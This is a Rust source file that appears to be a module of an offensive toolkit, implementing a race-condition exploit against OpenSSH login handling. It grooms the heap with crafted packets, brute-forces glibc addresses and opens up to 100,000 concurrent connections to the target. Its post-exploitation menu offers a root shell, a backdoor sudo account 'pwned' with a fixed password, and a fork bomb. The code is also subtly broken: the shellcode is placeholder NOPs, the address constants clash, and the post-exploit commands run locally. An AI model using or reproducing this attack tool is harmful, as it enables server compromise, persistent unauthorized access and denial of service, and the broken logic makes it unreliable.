use std::io::{stdin, stdout, Write, BufRead};
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::{sleep, Duration, Instant};
use tokio::process::Command;
use tokio::sync::Semaphore;
use futures_util::stream::{FuturesUnordered, StreamExt};
use rand::Rng;
use std::sync::Arc;
use anyhow::{Result, bail};
use std::io::ErrorKind;




// // Shellcode to inject
const SHELLCODE: &[u8] = b"\x90\x90\x90\x90";
// // GLIBC base addresses to brute force
const GLIBC_BASES: [u64; 2] = [0xb7200000, 0xb7400000];
// // SSH Login grace time window in seconds
const LOGIN_GRACE_TIME: f64 = 120.0;
// // Max size of a crafted packet
const MAX_PACKET_SIZE: usize = 256 * 1024;
// // Max parallel attempts at once



// 2 MiB alignment
const GLIBC_ALIGN: u64 = 0x0020_0000;
// Lower/upper bounds for your targetâ€™s glibc region
const GLIBC_LOWER: u64 = 0x7ffff7000000;
const GLIBC_UPPER: u64 = 0x7ffff9000000;

// Precompute how many slots are in that range
fn glibc_steps() -> u64 {
    ((GLIBC_UPPER - GLIBC_LOWER) / GLIBC_ALIGN) + 1
}

/// On-the-fly random, 2 MiB-aligned glibc base
fn random_glibc_base() -> u64 {
    let steps = glibc_steps();
    let idx = rand::rng().random_range(0..steps);
    GLIBC_LOWER + idx * GLIBC_ALIGN
}

// // Align memory chunks
fn chunk_align(s: usize) -> usize {
    (s + 15) & !15
}



// NEW: Normalize target address (IPv4, IPv6 with any bracket mess)
fn normalize_target(ip: &str, port: u16) -> Result<String> {
    let ip = ip.trim_matches(|c| c == '[' || c == ']'); // Remove any number of [ ]
    if ip.contains(':') && !ip.contains('.') {
        Ok(format!("[{}]:{}", ip, port)) // IPv6 must have brackets
    } else {
        Ok(format!("{}:{}", ip, port)) // IPv4 or hostname
    }
}

// // Create TCP connection to target
async fn setup_connection(ip: &str, port: u16) -> Result<TcpStream> {
    let addr = normalize_target(ip, port)?;
    let stream = TcpStream::connect(addr).await?;
    Ok(stream)
}


// // Send custom SSH packet
async fn send_packet(stream: &mut TcpStream, packet_type: u8, data: &[u8]) -> Result<()> {
    let len = data.len() + 5;
    let mut packet = vec![0u8; len];
    packet[0..4].copy_from_slice(&(len as u32).to_be_bytes());
    packet[4] = packet_type;
    packet[5..].copy_from_slice(data);
    stream.write_all(&packet).await?;
    Ok(())
}


// // Receive response with retry
async fn recv_retry(stream: &mut TcpStream, buf: &mut [u8]) -> Result<usize> {
    loop {
        match stream.read(buf).await {
            Ok(n) if n > 0 => return Ok(n),
            Ok(_) => bail!("Connection closed"),
            Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                sleep(Duration::from_millis(1)).await;
                continue;
            }
            Err(e) => return Err(e.into()),
        }
    }
}


// // Send SSH version string
async fn send_ssh_version(stream: &mut TcpStream) -> Result<()> {
    stream.write_all(b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n").await?;
    Ok(())
}


// // Receive SSH version from server
async fn receive_ssh_version(stream: &mut TcpStream) -> Result<()> {
    let mut buffer = [0u8; 256];
    recv_retry(stream, &mut buffer).await?;
    Ok(())
}


// // Send SSH KEX INIT packet
async fn send_kex_init(stream: &mut TcpStream) -> Result<()> {
    let payload = vec![0u8; 36];
    send_packet(stream, 20, &payload).await
}


// // Receive KEX INIT response
async fn receive_kex_init(stream: &mut TcpStream) -> Result<()> {
    let mut buffer = [0u8; 1024];
    recv_retry(stream, &mut buffer).await?;
    Ok(())
}


async fn perform_ssh_handshake(stream: &mut TcpStream) -> Result<()> {
    send_ssh_version(stream).await?;
    receive_ssh_version(stream).await?;
    send_kex_init(stream).await?;
    receive_kex_init(stream).await?;
    Ok(())
}

async fn prepare_heap(stream: &mut TcpStream) -> Result<()> {
    for _ in 0..10 {
        let data = vec![b'A'; 64];
        send_packet(stream, 5, &data).await?;
    }
    for _ in 0..27 {
        let large = vec![b'B'; 8192];
        let small = vec![b'C'; 320];
        send_packet(stream, 5, &large).await?;
        send_packet(stream, 5, &small).await?;
    }
    for _ in 0..27 {
        let mut fake = vec![0u8; 4096];
        create_fake_file_structure(&mut fake, GLIBC_BASES[0]);
        send_packet(stream, 5, &fake).await?;
    }
    let large_fill = vec![b'E'; MAX_PACKET_SIZE - 1];
    send_packet(stream, 5, &large_fill).await?;
    Ok(())
}


// // Send malformed public key and measure delay
async fn measure_response_time(stream: &mut TcpStream, error_type: u8) -> Result<f64> {
    let error_packet = if error_type == 1 {
        b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3".to_vec()
    } else {
        b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9".to_vec()
    };

    let start = Instant::now();
    send_packet(stream, 50, &error_packet).await?;

    let mut buf = [0u8; 1024];
    let _ = stream.read(&mut buf).await;

    Ok(start.elapsed().as_secs_f64())
}


// // Calculate parsing delay
async fn time_final_packet(stream: &mut TcpStream) -> Result<f64> {
    let t1 = measure_response_time(stream, 1).await?;
    let t2 = measure_response_time(stream, 2).await?;
    Ok(t2 - t1)
}

fn create_fake_file_structure(buf: &mut [u8], base: u64) {
    if buf.len() >= 8 {
        buf[..8].copy_from_slice(&base.to_le_bytes());
    }
}

// // Create packet with shellcode and fake structures
fn create_public_key_packet(buffer: &mut [u8], base: u64) {
    buffer.fill(0);
    buffer[..8].copy_from_slice(b"ssh-rsa ");
    let offset = chunk_align(4096) * 13 + chunk_align(304) * 13;
    buffer[offset..offset + SHELLCODE.len()].copy_from_slice(SHELLCODE);
    for i in 0..27 {
        let pos = chunk_align(4096) * (i + 1) + chunk_align(304) * i;
        create_fake_file_structure(&mut buffer[pos..pos + 304], base);
    }
}

// // Attempt to trigger race condition
async fn attempt_race_condition(mut stream: TcpStream, parsing_time: f64, base: u64) -> Result<bool> {
    let mut payload = vec![0u8; MAX_PACKET_SIZE];
    create_public_key_packet(&mut payload, base);

    stream.write_all(&payload[..payload.len() - 1]).await?;

    let wait_time = LOGIN_GRACE_TIME - parsing_time - 0.001;
    sleep(Duration::from_secs_f64(wait_time)).await;

    stream.write_all(&payload[payload.len() - 1..]).await?;

    let mut buf = [0u8; 1024];
    match stream.read(&mut buf).await {
        Ok(n) if n > 0 && !buf.starts_with(b"SSH-2.0-") => Ok(true),
        Ok(0) => Ok(true),
        Err(_) => Ok(true),
        _ => Ok(false),
    }
}


// // Execute post-exploitation action
fn post_exploit_action(option: u8) {
    match option {
        1 => {
            println!("[+] Root shell enabled - attach manually via SSH");
        }
        2 => {
            println!("[+] Creating persistent user...");
            let _ = Command::new("bash")
                .arg("-c")
                .arg("useradd -m -p $(openssl passwd -1 root123) pwned && usermod -aG sudo pwned")
                .status();
        }
        3 => {
            println!("[!] Triggering fork bomb...");
            let _ = Command::new("bash")
                .arg("-c")
                .arg(":(){ :|:& };:")
                .status();
        }
        _ => println!("[-] Invalid action"),
    }
}

// // Entry point for auto-dispatch system
pub async fn run(target: &str) -> Result<()> {
    println!("warning high resource usage Caustion!!!");
    println!("560k request in 5 seconds");
    println!("Select post-exploitation action:");
    println!(" 1. Remote Root Shell");
    println!(" 2. Persistence (create SSH user)");
    println!(" 3. Server Destruction (fork bomb)");

    let stdin = stdin();
    let mut choice = String::new();
    print!("Enter option [1-3]: ");
    stdout().flush()?;
    stdin.lock().read_line(&mut choice)?;
    let mode: u8 = choice.trim().parse().unwrap_or(0);
    if !(1..=3).contains(&mode) {
        bail!("Invalid option.");
    }

    println!("Do you want to run more than 10,000 attempts? [y/N or a number like 90000]");
    let mut input = String::new();
    stdin.lock().read_line(&mut input)?;
    let trimmed = input.trim();

    let mut attempts = 10000;
    if trimmed.eq_ignore_ascii_case("y") {
        println!("Enter total number of attempts:");
        input.clear();
        stdin.lock().read_line(&mut input)?;
        attempts = input.trim().parse::<usize>().unwrap_or(10000);
    } else if let Ok(n) = trimmed.parse::<usize>() {
        attempts = n;
    }

    let (ip, port) = if let Some((ip_part, port_part)) = target.rsplit_once(':') {
        let ip_clean = ip_part.trim_matches(|c| c == '[' || c == ']');
        (ip_clean.to_string(), port_part.parse::<u16>()?)
    } else {
        println!("No set target ip:port specified. Enter SSH port for {}: ", target);
        print!("Port: ");
        stdout().flush()?;
        let mut port_input = String::new();
        stdin.lock().read_line(&mut port_input)?;
        let port = port_input.trim().parse::<u16>()?;
        (target.trim_matches(|c| c == '[' || c == ']').to_string(), port)
    };

    let semaphore = Arc::new(Semaphore::new(100_000));
    let mut tasks: FuturesUnordered<tokio::task::JoinHandle<anyhow::Result<bool>>> = FuturesUnordered::new();

    for attempt in 0..attempts {
        let permit = semaphore.clone().acquire_owned().await?;
        let ip = ip.clone();
        let _mode = mode;

        tasks.push(tokio::spawn(async move {
            let _permit = permit;

            if attempt % 1000 == 0 {
                println!("[*] Attempt {}/{}", attempt, attempts);
            }

            // === NEW: pick a random glibc base each attempt ===
            let base = random_glibc_base();

            let mut stream = match setup_connection(&ip, port).await {
                Ok(s) => s,
                Err(_) => return Ok(false),
            };

            if perform_ssh_handshake(&mut stream).await.is_err() {
                return Ok(false);
            }

            if prepare_heap(&mut stream).await.is_err() {
                return Ok(false);
            }

            let Ok(parsing_time) = time_final_packet(&mut stream).await else {
                return Ok(false);
            };

            Ok(attempt_race_condition(stream, parsing_time, base).await.unwrap_or(false))
        }));
    }

    while let Some(result) = tasks.next().await {
        match result {
            Ok(Ok(true)) => {
                println!("[+] Exploit succeeded!");
                post_exploit_action(mode);
                return Ok(());
            }
            Ok(Ok(false)) => continue,
            Ok(Err(e)) => {
                eprintln!("[!] Exploit error: {}", e);
                continue;
            }
            Err(join_err) => {
                eprintln!("[!] Join error: {}", join_err);
                continue;
            }
        }
    }

    println!("[-] All attempts exhausted.");
    Ok(())
}
